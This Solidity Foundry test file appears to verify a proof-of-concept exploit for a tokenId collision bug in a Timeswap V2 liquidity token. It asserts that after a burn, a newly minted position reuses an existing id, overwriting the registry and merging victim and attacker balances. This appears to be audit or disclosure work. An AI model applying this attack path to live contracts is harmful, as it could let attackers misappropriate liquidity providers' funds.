// SPDX-License-Identifier: MIT
pragma solidity ^0.8.8;

import "forge-std/Test.sol";
import "./24902-h-02-timeswapv.sol";

contract TimeswapLiquidityTokenIdCollisionTest is Test {
    function test_tokenId_collision_after_burn() public {
        Exploit exploit = new Exploit();
        TimeswapV2LiquidityToken lt = exploit.lt();

        exploit.run();

        // Position A got id 1, B got id 2.
        assertEq(exploit.idA(), 1, "position A should be tokenId 1");
        assertEq(exploit.idB(), 2, "position B should be tokenId 2");

        // After burning A and minting C, C reuses tokenId 2 (collision with B).
        assertEq(exploit.idC(), 2, "position C should collide on tokenId 2");
        assertEq(exploit.idC(), exploit.idB(), "C and B share the same tokenId");

        // The id->position registry for tokenId 2 was overwritten from B to C.
        (address regToken0,,,) = lt._timeswapV2LiquidityTokenPositions(2);
        assertEq(regToken0, address(0xC0), "registry[2] overwritten to C's pair");

        // Two different holders/positions now share tokenId 2; the per-id supply
        // is the sum of two unrelated liquidity positions.
        assertEq(lt.balanceOf(address(0x5151), 2), 100, "victim B balance under id 2");
        assertEq(lt.balanceOf(address(exploit), 2), 100, "attacker C balance under id 2");
        assertEq(lt.idTotalSupply(2), 200, "id 2 supply conflates B + C");
    }
}
